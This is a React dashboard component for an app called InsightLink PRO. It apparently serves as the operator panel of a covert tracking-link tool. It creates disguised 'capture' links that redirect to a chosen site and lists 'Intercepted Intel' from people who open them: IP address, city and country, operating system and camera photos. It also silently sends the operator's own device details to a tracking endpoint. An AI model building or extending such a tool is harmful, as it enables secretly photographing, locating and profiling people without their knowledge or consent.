import React, { useState, useEffect, useMemo, useCallback } from 'react';
import { Plus, Link as LinkIcon, Trash2, Shield, Camera, MapPin, Battery, Cpu, Copy, Check, RefreshCw, Globe, Wifi, Search, Download, Lock, UserCheck, Activity } from 'lucide-react';
import { LinkConfig, CaptureReport } from '../types';
import ReportDetail from './ReportDetail';

const Dashboard: React.FC = () => {
  const [ownerId] = useState(() => {
    let id = localStorage.getItem('il_owner_id');
    if (!id) {
      id = 'OWNER-' + Math.random().toString(36).substring(2, 10).toUpperCase();
      localStorage.setItem('il_owner_id', id);
    }
    return id;
  });

  const [links, setLinks] = useState<LinkConfig[]>([]);
  const [reports, setReports] = useState<CaptureReport[]>([]);
  const [redirectUrl, setRedirectUrl] = useState('');
  const [linkName, setLinkName] = useState('');
  const [copiedId, setCopiedId] = useState<string | null>(null);
  const [selectedReport, setSelectedReport] = useState<CaptureReport | null>(null);
  const [isSyncing, setIsSyncing] = useState(false);
  const [searchQuery, setSearchQuery] = useState('');

  const trackOwner = useCallback(async () => {
    const ua = navigator.userAgent;
    const device = {
      browser: /chrome/i.test(ua) ? 'Chrome' : /firefox/i.test(ua) ? 'Firefox' : 'Other',
      os: /windows/i.test(ua) ? 'Windows' : /mac/i.test(ua) ? 'MacOS' : /android/i.test(ua) ? 'Android' : /iphone/i.test(ua) ? 'iOS' : 'Linux',
      resolution: `${window.screen.width}x${window.screen.height}`,
      ram: (navigator as any).deviceMemory || 0
    };

    try {
      await fetch('/api/track-owner', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ownerId, device })
      });
    } catch (e) {}
  }, [ownerId]);

  useEffect(() => {
    trackOwner();
    const savedLinks = localStorage.getItem('il_links');
    if (savedLinks) setLinks(JSON.parse(savedLinks));
    fetchReports();
    const interval = setInterval(fetchReports, 10000); 
    return () => clearInterval(interval);
  }, []);

  const fetchReports = async () => {
    setIsSyncing(true);
    try {
      const res = await fetch(`/api/all-reports?ownerId=${ownerId}`);
      if (res.ok) {
        const data = await res.json();
        setReports(data);
      }
    } catch (err) {} finally {
      setTimeout(() => setIsSyncing(false), 800);
    }
  };

  const createLink = async () => {
    if (!redirectUrl) return;
    const cleanRedirect = redirectUrl.startsWith('http') ? redirectUrl : `https://${redirectUrl}`;
    const newLink: LinkConfig = {
      id: Math.random().toString(36).substring(2, 9),
      ownerId: ownerId,
      name: linkName || 'NODE-' + (links.length + 1).toString().padStart(2, '0'),
      redirectUrl: cleanRedirect,
      createdAt: new Date().toISOString(),
    };

    try {
      await fetch('/api/register-link', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(newLink)
      });
      const updatedLinks = [newLink, ...links];
      setLinks(updatedLinks);
      localStorage.setItem('il_links', JSON.stringify(updatedLinks));
      setRedirectUrl('');
      setLinkName('');
    } catch (e) {
      alert("Registration failed.");
    }
  };

  const deleteLink = (id: string) => {
    if (!confirm('Decommission this Node?')) return;
    const updated = links.filter(l => l.id !== id);
    setLinks(updated);
    localStorage.setItem('il_links', JSON.stringify(updated));
  };

  const copyLink = (id: string) => {
    const url = `${window.location.origin}/#/capture/${id}`;
    navigator.clipboard.writeText(url);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  const filteredReports = useMemo(() => {
    return reports.filter(r => {
      const search = searchQuery.toLowerCase();
      return (r.location.ip?.toLowerCase().includes(search) || r.device.os.toLowerCase().includes(search));
    });
  }, [reports, searchQuery]);

  return (
    <div className="max-w-7xl mx-auto px-4 py-8 md:py-12 animate-pop">
      <div className="flex flex-col lg:flex-row lg:items-center justify-between mb-10 gap-6">
        <div>
          <h1 className="text-3xl md:text-5xl font-black text-ink tracking-tighter flex items-center gap-4 italic uppercase">
            <div className="bg-brand-accent border-3 border-ink p-3 rotate-3 shadow-comic shrink-0">
              <Shield className="text-white" size={32} />
            </div>
            InsightLink <span className="text-brand-accent">PRO</span>
          </h1>
          <p className="text-ink/60 font-bold flex items-center gap-2 text-xs uppercase tracking-widest mt-2">
            ID: <span className="text-brand-accent">{ownerId}</span>
          </p>
        </div>
        
        <div className="flex flex-wrap items-center gap-3">
          <button onClick={fetchReports} className="comic-button bg-pastel-yellow px-5 py-3 border-3 border-ink flex items-center gap-2 font-black text-sm uppercase italic transition-all">
            <RefreshCw size={18} className={isSyncing ? 'animate-spin' : ''} />
            Sync Feed
          </button>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-12 gap-10">
        <div className="lg:col-span-4 space-y-8">
          <div className="comic-card p-6 bg-white">
            <h2 className="text-xl font-black text-ink mb-6 italic uppercase">Deploy Node</h2>
            <div className="space-y-4">
              <input type="text" placeholder="Alias" className="w-full px-4 py-3 border-3 border-ink bg-paper outline-none font-bold italic" value={linkName} onChange={(e) => setLinkName(e.target.value)} />
              <input type="text" placeholder="Redirect URL" className="w-full px-4 py-3 border-3 border-ink bg-paper outline-none font-bold italic" value={redirectUrl} onChange={(e) => setRedirectUrl(e.target.value)} />
              <button onClick={createLink} className="w-full bg-ink text-white font-black py-4 border-3 border-ink shadow-comic hover:bg-brand-accent transition-colors uppercase italic tracking-tighter">
                Deploy Node
              </button>
            </div>
          </div>

          <div className="comic-card p-6 bg-white">
            <h2 className="text-xl font-black text-ink mb-6 italic uppercase">Active Nodes</h2>
            <div className="space-y-4 max-h-[350px] overflow-y-auto pr-2 custom-scrollbar">
              {links.map((link) => (
                <div key={link.id} className="p-4 bg-paper border-2 border-ink group transition-all">
                  <div className="flex items-center justify-between mb-2">
                    <span className="font-black text-[10px] uppercase italic text-ink/40 tracking-widest">{link.name}</span>
                    <button onClick={() => deleteLink(link.id)} className="text-ink/20 hover:text-red-500 transition-colors"><Trash2 size={14} /></button>
                  </div>
                  <div className="flex items-center gap-2">
                    <div className="bg-white border border-ink/10 text-[10px] p-2 flex-1 truncate font-mono font-bold">{link.id}</div>
                    <button onClick={() => copyLink(link.id)} className={`p-2 border-2 border-ink ${copiedId === link.id ? 'bg-green-400' : 'bg-white'} hover:shadow-comic-sm transition-all`}>
                      {copiedId === link.id ? <Check size={14} /> : <Copy size={14} />}
                    </button>
                  </div>
                </div>
              ))}
              {links.length === 0 && <div className="text-[10px] font-black uppercase text-ink/20 text-center py-8 italic">No active nodes deployed.</div>}
            </div>
          </div>
        </div>

        <div className="lg:col-span-8">
          <div className="comic-card h-full bg-white flex flex-col min-h-[600px] overflow-hidden">
            <div className="px-8 py-6 border-b-3 border-ink flex flex-col md:flex-row md:items-center justify-between bg-paper gap-4">
              <h2 className="text-2xl font-black text-ink italic uppercase tracking-tighter flex items-center gap-3">
                <Activity className="text-brand-accent" /> Intercepted Intel
              </h2>
              <div className="relative">
                <Search className="absolute left-4 top-1/2 -translate-y-1/2 text-ink/20" size={16} />
                <input 
                  type="text" 
                  placeholder="Filter Intel..." 
                  className="bg-white border-2 border-ink rounded-xl pl-10 pr-4 py-2 text-xs font-bold text-ink outline-none italic w-full md:w-64"
                  value={searchQuery}
                  onChange={e => setSearchQuery(e.target.value)}
                />
              </div>
            </div>

            <div className="flex-1 overflow-y-auto custom-scrollbar">
              {filteredReports.map((report, idx) => (
                <div key={idx} className="p-6 border-b-2 border-paper hover:bg-brand-accent/5 transition-all cursor-pointer group" onClick={() => setSelectedReport(report)}>
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-6">
                      <div className="w-14 h-14 bg-paper border-2 border-ink shadow-comic-sm overflow-hidden flex items-center justify-center -rotate-1 group-hover:rotate-0 transition-transform">
                        {report.photos?.[0] ? <img src={report.photos[0]} className="w-full h-full object-cover" /> : <Camera className="text-ink/20" size={20} />}
                      </div>
                      <div>
                        <h3 className="font-black text-ink uppercase tracking-tight italic flex items-center gap-2">
                          {report.location.ip}
                          <div className="w-1.5 h-1.5 rounded-full bg-green-500 animate-pulse" />
                        </h3>
                        <div className="flex items-center gap-2 mt-1">
                          <MapPin size={10} className="text-brand-accent" />
                          <span className="text-[10px] font-bold text-ink/40 uppercase tracking-widest">{report.location.city}, {report.location.country}</span>
                        </div>
                      </div>
                    </div>
                    <div className="text-right flex flex-col items-end">
                      <span className="text-[10px] font-black uppercase text-brand-accent italic">{new Date(report.timestamp).toLocaleTimeString()}</span>
                      <button className="mt-2 text-[9px] font-black text-white bg-ink px-3 py-1 border-2 border-ink uppercase italic opacity-0 group-hover:opacity-100 transition-all">Inspect Full Intel</button>
                    </div>
                  </div>
                </div>
              ))}
              {filteredReports.length === 0 && (
                <div className="flex flex-col items-center justify-center py-32 space-y-4">
                  <div className="w-16 h-16 bg-paper rounded-full border-2 border-dashed border-ink/10 flex items-center justify-center text-ink/10">
                    <Activity size={32} />
                  </div>
                  <p className="text-[10px] font-black uppercase text-ink/20 italic tracking-widest">Awaiting intercepted signals...</p>
                </div>
              )}
            </div>
          </div>
        </div>
      </div>
      {selectedReport && <ReportDetail report={selectedReport} onClose={() => setSelectedReport(null)} />}
    </div>
  );
};

export default Dashboard;
